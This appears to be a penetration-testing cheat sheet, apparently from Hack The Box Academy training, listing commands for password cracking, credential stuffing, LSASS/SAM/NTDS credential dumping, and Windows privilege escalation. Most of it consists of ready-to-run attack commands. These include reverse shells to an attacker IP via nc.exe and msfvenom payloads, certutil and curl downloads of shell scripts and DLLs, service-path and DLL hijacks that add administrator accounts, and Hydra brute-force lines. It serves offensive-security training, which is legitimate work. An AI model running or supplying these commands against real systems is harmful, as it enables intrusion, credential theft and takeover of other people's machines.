| ``xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!`` | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol. |

| ``evil-winrm -i <ip> -u user -p password`` | Uses Evil-WinRM to establish a Powershell session with a target. |

| ``ssh user@<ip>`` | Uses SSH to connect to a target using a specified user. |

| ``smbclient -U user \\\\<ip>\\SHARENAME`` | Uses smbclient to connect to an SMB share using a specified user. |

| ``python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/`` | Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host. |

| `---------------------------------------------------------------------------------------------------------------------------------------` | ------------------------------------------------------------------------------------------------------------------------------------------------------- |

| ``cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist`` | Uses cewl to generate a wordlist based on keywords present on a website. |

| ``hashcat --force password.list -r custom.rule --stdout > mut_password.list`` | Uses Hashcat to generate a rule-based word list. |

| ``./username-anarchy -i /path/to/listoffirstandlastnames.txt`` | Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username. |

| ``curl -s https://fileinfo.com/filetypes/compressed \| html2text \| awk '{print tolower($1)}' \| grep "\." \| tee -a compressed_ext.txt`` | Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords. |

| `------------------------------------------------------------------------------------------------------` | ---------------------------------- |

| `**Credential Stuffing**` |  |

| `[DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)` | For Credential Stuffing |

| ``hydra -C <user_pass.list> <protocol>://<IP>`` | Credential Stuffing - Hydra Syntax |

| `[Router Default Creds](https://www.softwaretestinghelp.com/default-router-username-and-password-list/)` |  |

| `----------------------------------------------------------------------` | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

| ``crackmapexec smb <ip> -u "user" -p "password" --shares`` | Uses CrackMapExec to enumerate smb shares on a target using a specified set of credentials. |

| ``hydra -L user.list -P password.list <service>://<ip>`` | Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service. |

| ``hydra -l username -P password.list <service>://<ip>`` | Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service. |

| ``hydra -l user.list -p password <service>://<ip>`` | Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service. |

| ``hydra -C <user_pass.list> ssh://<IP>`` | Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack. |

| ``crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam`` | Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network. |

| ``crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa`` | Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way. |

| ``crackmapexec smb <ip> -u <username> -p <password> --ntds`` | Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network. |

| ``evil-winrm -i <ip>  -u  Administrator -H "<passwordhash>"`` | Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of `Pass-The-Hash` attack. |

| `-------------` | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |

| `hklm\sam` | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |

| `hklm\system` | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database. |

| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target. |

| `--------------------------------------------------------------------------------------------------------` | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

| `Task Manager Method` | Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file _A file called lsass.DMP is created and saved in:_ `C:\Users\loggedonusersdirectory\AppData\Local\Temp` |

| ``tasklist /svc`` | A command-line-based utility in Windows used to list running processes. |

| ``findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`` | Uses Windows command-line based utility findstr to search for the string "password" in many different file type. |

| ``gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt'`` | Review Dictionary file for sensitive information |

| ``Get-Process lsass`` | A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line. |

| ``rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`` | Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials. |

| ``pypykatz lsa minidump /path/to/lsassdumpfile`` | Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file. |

| ``reg.exe save hklm\sam C:\sam.save`` | Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system). |

| ``move sam.save \\<ip>\NameofFileShare`` | Uses move in Windows to transfer a file to a specified file share over the network. |

| ``python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`` | Uses Secretsdump.py to dump password hashes from the SAM database. |

| ``vssadmin CREATE SHADOW /For=C:`` | Uses Windows command line based tool vssadmin to create a volume shadow copy for `C:`. This can be used to make a copy of NTDS.dit safely. |

| ``cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`` | Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of `C:`. |

| ``crackmapexec smb IP -u administrator -p pass -M lsassy ` (Need --local-auth if user is local account)` | Dump LSASS using Lsassy module remotely |

| `` crackmapexec smb 192.168.255.131 -u administrator -p pass -M nanodump`` | Dump LSASS using nanodump module |

| ``./username-anarchy -i /home/ltnbob/names.txt`` | Creating a Custom list of Usernames |

| ``start lazagne.exe all`` | We can also take advantage of third-party tools like [Lazagne](https://github.com/AlessandroZ/LaZagne/releases/) to quickly discover credentials that web browsers or other installed applications may insecurely store. -CMD |

| `-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------` | ------------------------------------------------------------------------------------------------------------------------- |

| ``for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done`` | Script that can be used to find .conf, .config and .cnf files on a Linux system. |

| ``for i in $(find / -name *.cnf 2>/dev/null \| grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null \| grep -v "\#";done`` | Script that can be used to find credentials in specified file types. |

| ``for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share\|man";done`` | Script that can be used to find common database files. |

| ``find /home/* -type f -name "*.txt" -o ! -name "*.*"`` | Uses Linux-based find command to search for text files. |

| ``for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share";done`` | Script that can be used to search for common file types used with scripts. |

| ``for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done`` | Script used to look for common types of documents. |

| ``cat /etc/crontab`` | Uses Linux-based cat command to view the contents of crontab in search for credentials. |

| ``ls -la /etc/cron.*/`` | Uses Linux-based ls -la command to list all files that start with `cron` contained in the etc directory. |

| ``grep -rnw "PRIVATE KEY" /* 2>/dev/null \| grep ":1"`` | Uses Linux-based command grep to search the file system for key terms `PRIVATE KEY` to discover SSH keys. |

| ``grep -rnw "PRIVATE KEY" /home/* 2>/dev/null \| grep ":1"`` | Uses Linux-based grep command to search for the keywords `PRIVATE KEY` within files contained in a user's home directory. |

| ``grep -rnw "ssh-rsa" /home/* 2>/dev/null \| grep ":1"`` | Uses Linux-based grep command to search for keywords `ssh-rsa` within files contained in a user's home directory. |

| ``tail -n5 /home/*/.bash*`` | Uses Linux-based tail command to search the through bash history files and output the last 5 lines. |

| ``python3 mimipenguin.py`` | Runs Mimipenguin.py using python3. |

| ``bash mimipenguin.sh`` | Runs Mimipenguin.sh using bash. |

| ``python2.7 lazagne.py all`` | Runs Lazagne.py with all modules using python2.7 |

| ``ls -l .mozilla/firefox/ \| grep default `` | Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword `default` using grep. |

| ``cat .mozilla/firefox/1bplpd86.default-release/logins.json \| jq .`` | Uses Linux-based command cat to search for credentials stored by Firefox in JSON. |

| ``python3.9 firefox_decrypt.py`` | Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9. |

| ``python3 lazagne.py browsers`` | Runs Lazagne.py browsers module using Python 3. |

| `**Passwd, Shadow & Opasswd**` |  |

| `Cracking Linux Credentials` | Once we have collected some hashes, we can try to crack them in different ways to get the passwords in cleartext. |

| ``sudo cp /etc/passwd /tmp/passwd.bak`` | Moving the passwd file |

| ``sudo cp /etc/shadow /tmp/shadow.bak`` | Moving the shadow file |

| ``unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes`` | Unshadow |

| ``hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked`` | Hashcat - Cracking Unshadowed Hashes |

| ``hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`` | Hashcat - Cracking MD5 Hashes |

| `------------------------------------------------------------------------------------------------------------` | ---------------------------------------------------------------------------------------------------------------------------------------------- |

| ``hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt`` | Uses Hashcat to crack NTLM hashes using a specified wordlist. |

| ``hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show`` | Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output. |

| ``unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes`` | Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking. |

| ``hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked`` | Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked. |

| ``hashcat -a 0 -m 0 HASH /usr/share/wordlists/WORDLIST -r /usr/share/hashcat/rules/best64.rule`|` | Uses Hashcat in conjunction with best64.rule, which contains 64 standard password modifications—such as appending numbers or substituting characters with their "leet" equivalents. To perform this kind of attack, we would append the -r <ruleset> |

| ``hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked`` | Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked. |

| ``ssh2john.pl SSH.private > ssh.hash`` | Runs Ssh2john.pl script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash. |

| ``john ssh.hash --show`` | Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal. |

| ``office2john.py Protected.docx > protected-docx.hash`` | Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash. |

| ``john --wordlist=rockyou.txt protected-docx.hash`` | Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash. |

| ``pdf2john.pl PDF.pdf > pdf.hash`` | Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked. |

| ``john --wordlist=rockyou.txt pdf.hash`` | Runs John in conjunction with a wordlist to crack a pdf hash. |

| ``zip2john ZIP.zip > zip.hash`` | Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash. |

| ``john --wordlist=rockyou.txt zip.hash`` | Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash. |

| ``bitlocker2john -i Backup.vhd > backup.hashes`` | Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes. |

| ``file GZIP.gzip`` | Uses the Linux-based file tool to gather file format information. |

| ``for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null \| tar xz;done`` | Script that runs a for-loop to extract files from an archive. |

| `---` | --- |

| ``lxc image import PATH --alias ALIAS`` | Import image file. Replace PATH with location and Alias with easy to use name |

| ``lxc image list`` | list imported image files |

| ``lxc start privesc`` | Start container |

| ``lxc exec privesc /bin/bash `` | Log into container |

| `---` | ----------- |

| `**Group**` | **Description** |

| `Default Administrators` | Domain Admins and Enterprise Admins are "super" groups. |

| `Server Operators` | Members can modify services, access SMB shares, and backup files. |

| `Backup Operators` | Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs. |

| `Print Operators` | Members can log on to DCs locally and "trick" Windows into loading a malicious driver. |

| `Hyper-V Administrators` | If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins. |

| `Account Operators` | Members can modify non-protected accounts and groups in the domain. |

| `Remote Desktop Users` | Members are not given any useful permissions by default but are often granted additional rights such as `Allow Login Through Remote Desktop Services` and can move laterally using the RDP protocol. |

| `Remote Management Users` | Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs). |

| `Group Policy Creator Owners` | Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU. |

| `Schema Admins` | Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL. |

| `DNS Admins` | Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to [create a WPAD record](https://web.archive.org/web/20231115070425/https://cube0x0.github.io/Pocing-Beyond-DA/). |

| `**Setting [Constant](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)**` | **Setting Name** |

| `SeNetworkLogonRight` | [Access this computer from the network](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network) |

| `SeRemoteInteractiveLogonRight` | [Allow log on through Remote Desktop Services](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services) |

| `SeBackupPrivilege` | [Back up files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories) |

| `SeSecurityPrivilege` | [Manage auditing and security log](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log) |

| `SeTakeOwnershipPrivilege` | [Take ownership of files or other objects](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) |

| `SeDebugPrivilege` | [Debug programs](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) |

| `SeImpersonatePrivilege` | [Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication) |

| `SeLoadDriverPrivilege` | [Load and unload device drivers](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers) |

| `SeRestorePrivilege` | [Restore files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories) |

| `[Enable SeTakeOwnership Priv](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)` | We can enable it using this script which is detailed in this blog post, as well as this one which builds on the initial concept. |

| ``Import-Mobule .\Enable-Privilege.ps1`` | Import module with powershell |

| ``.\EnablingAllTokenPrivs.ps1`` | Run script |

| ``whoami /priv`` | Check privilege |

| ``Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' \| Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}`` | Check details of specific file |

| ``cmd /c dir /q 'C:\Department Shares\Private\IT'`` | Get ownership of Directory |

| ``takeown /f 'C:\Department Shares\Private\IT\cred.txt'`` | Take ownership, SeTakeOwnershipPrivilege necessary |

| ``icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F`` | Modify ACL to allow file to be viewed by user |

| ``Import-Module .\SeBackupPrivilegeUtils.dll Import-Module .\SeBackupPrivilegeCmdLets.dll`` | Import both modules |

| ``whoami /priv \| findstr Backup`` | Priv check |

| ``Get-SeBackupPrivilege`` | Checks for right once module imported |

| `**Group Policy Setting**` | **Registry Key** |

| `[User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)` | FilterAdministratorToken |

| `[User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)` | EnableUIADesktopToggle |

| `[User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)` | ConsentPromptBehaviorAdmin |

| `[User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)` | ConsentPromptBehaviorUser |

| `[User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)` | EnableInstallerDetection |

| `[User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)` | ValidateAdminCodeSignatures |

| `[User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)` | EnableSecureUIAPaths |

| `[User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)` | EnableLUA |

| `[User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)` | PromptOnSecureDesktop |

| `[User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)` | EnableVirtualization |

| ``mssqlclient.py sql_dev@10.129.43.30 -windows-auth`` | Connect using mssqlclient.py |

| ``enable_xp_cmdshell`` | Enable xp\_cmdshell with mssqlclient.py |

| ``xp_cmdshell whoami`` | Run OS commands with xp\_cmdshell |

| ``c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"`` | Escalating privileges with [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) |

| ``procdump.exe -accepteula -ma lsass.exe lsass.dmp`` | Take memory dump with ProcDump |

| ``sekurlsa::minidump lsass.dmp` and `sekurlsa::logonpasswords`` | Use MimiKatz to extract credentials from LSASS memory dump |

| ``dir /q C:\backups\wwwroot\web.config`` | Checking ownership of a file |

| ``takeown /f C:\backups\wwwroot\web.config`` | Taking ownership of a file |

| ``Get-ChildItem -Path ‘C:\backups\wwwroot\web.config’ \| select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}}`` | Confirming chan2ged ownership of a file |

| ``icacls “C:\backups\wwwroot\web.config” /grant htb-student:F`` | Modifying a file ACL |

| ``secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`` | Extract hashes with secretsdump.py |

| ``robocopy /B E:\Windows\NTDS .\ntds ntds.dit`` | Copy files with ROBOCOPY |

| ``wevtutil qe Security /rd:true /f:text \| Select-String "/user"`` | Searching security event logs |

| ``wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 \| findstr "/user"`` | Passing credentials to wevtutil |

| ``Get-WinEvent -LogName security \| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } \| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}`` | Searching event logs with PowerShell |

| ``msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll`` | Generate malicious DLL |

| ``dnscmd.exe /config /serverlevelplugindll adduser.dll`` | Loading a custom DLL with dnscmd |

| ``wmic useraccount where name="netadm" get sid`` | Finding a user's SID |

| ``sc.exe sdshow DNS`` | Checking permissions on DNS service |

| ``sc stop dns`` | Stopping a service |

| ``sc start dns`` | Starting a service |

| ``reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`` | Querying a registry key |

| ``reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll`` | Deleting a registry key |

| ``sc query dns`` | Checking a service status |

| ``Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`` | Disabling the global query block list |

| ``Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3`` | Adding a WPAD record |

| ``cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`` | Compile with cl.exe |

| ``reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"`` | Add reference to a driver (1) |

| ``reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1`` | Add reference to a driver (2) |

| ``.\DriverView.exe /stext drivers.txt` and `cat drivers.txt \| Select-String -pattern Capcom`` | Check if driver is loaded |

| ``EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys`` | Using EopLoadDriver |

| ``c:\Tools\PsService.exe security AppReadiness`` | Checking service permissions with PsService |

| ``sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"`` | Modifying a service binary path |

| ``REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`` | Confirming UAC is enabled |

| ``REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`` | Checking UAC level |

| ``[environment]::OSVersion.Version`` | Checking Windows version |

| ``cmd /c echo %PATH%`` | Reviewing path variable |

| ``curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"`` | Downloading file with cURL in PowerShell |

| ``rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll`` | Executing custom dll with rundll32.exe |

| ``.\SharpUp.exe audit`` | Running SharpUp |

| ``icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"`` | Checking service permissions with icacls |

| ``cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"`` | Replace a service binary |

| ``wmic service get name,displayname,pathname,startmode \| findstr /i "auto" \| findstr /i /v "c:\windows\\" \| findstr /i /v """`` | Searching for unquoted service paths |

| ``accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services`` | Checking for weak service ACLs in the Registry |

| ``Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"`` | Changing ImagePath with PowerShell |

| ``Get-CimInstance Win32_StartupCommand \| select Name, command, Location, User \| fl`` | Check startup programs |

| ``msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe`` | Generating a malicious binary |

| ``get-process -Id 3324`` | Enumerating a process ID with PowerShell |

| ``get-service \| ? {$_.DisplayName -like 'Druva*'}`` | Enumerate a running service by name with PowerShell |

| ``reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`` | Query registry to see if Always Install Elevated is set. If so Can create a malicious msi using PowerUp.ps1 |

| ``Import-Module .\PowerUp.ps1 & Write-UserAddMSI`` | Import [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) and create malicious msi to create backdoor user |

| ``runas /user:backdoor cmd`` | Run as created user, in this case backdoor |

| ``findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml`` | Search for files with the phrase "password" |

| ``gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' \| Select-String password`` | Searching for passwords in Chrome dictionary files |

| ``(Get-PSReadLineOption).HistorySavePath`` | Confirm PowerShell history save path |

| ``gc (Get-PSReadLineOption).HistorySavePath`` | Reading PowerShell history file |

| ``$credential = Import-Clixml -Path 'C:\scripts\pass.xml'`` | Decrypting PowerShell credentials |

| ``cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt`` | Searching file contents for a string |

| ``findstr /si password *.xml *.ini *.txt *.config`` | Searching file contents for a string |

| ``findstr /spin "password" *.*`` | Searching file contents for a string |

| ``select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password`` | Search file contents with PowerShell |

| ``dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*`` | Search for file extensions |

| ``where /R C:\ *.config`` | Search for file extensions |

| ``Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore`` | Search for file extensions using PowerShell |

| ``cmdkey /list`` | List saved credentials |

| ``.\SharpChrome.exe logins /unprotect`` | Retrieve saved Chrome credentials |

| ``.\lazagne.exe -h`` | View LaZagne help menu |

| ``.\lazagne.exe all`` | Run all LaZagne modules |

| ``Invoke-SessionGopher -Target WINLPE-SRV01`` | Running SessionGopher |

| ``netsh wlan show profile`` | View saved wireless networks |

| ``netsh wlan show profile ilfreight_corp key=clear`` | Retrieve saved wireless passwords |

| ``certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat`` | Transfer file with certutil |

| ``certutil -encode file1 encodedfile`` | Encode file with certutil |

| ``certutil -decode encodedfile file2`` | Decode file with certutil |

| ``reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`` | Query for always install elevated registry key (1) |

| ``reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`` | Query for always install elevated registry key (2) |

| ``msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi`` | Generate a malicious MSI package |

| ``msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart`` | Executing an MSI package from command line |

| ``schtasks /query /fo LIST /v`` | Enumerate scheduled tasks |

| ``Get-ScheduledTask \| select TaskName,State`` | Enumerate scheduled tasks with PowerShell |

| ``.\accesschk64.exe /accepteula -s -d C:\Scripts\`` | Check permissions on a directory |

| ``Get-LocalUser`` | Check local user description field |

| ``Get-WmiObject -Class Win32_OperatingSystem \| select Description`` | Enumerate computer description field |

| ``Get-WmiObject -Class Win32_Product \|  select Name, Version`` | Enumerate installed products |

| ``guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd`` | Mount VMDK on Linux |

| ``guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1`` | Mount VHD/VHDX on Linux |

| ``sudo python2.7 windows-exploit-suggester.py --update`` | Update Windows Exploit Suggester database |

| ``python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt`` | Running Windows Exploit Suggester |

| `**Tool**` | **Description** |

| `[Seatbelt](https://github.com/GhostPack/Seatbelt)` | C# project for performing a wide variety of local privilege escalation checks |

| `[winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)` | WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained [here](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) |

| `[PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)` | PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found |

| `[SharpUp](https://github.com/GhostPack/SharpUp)` | C# version of PowerUp |

| `[JAWS](https://github.com/411Hall/JAWS)` | PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0 |

| `[SessionGopher](https://github.com/Arvanaghi/SessionGopher)` | SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information |

| `[Watson](https://github.com/rasta-mouse/Watson)` | Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities. |

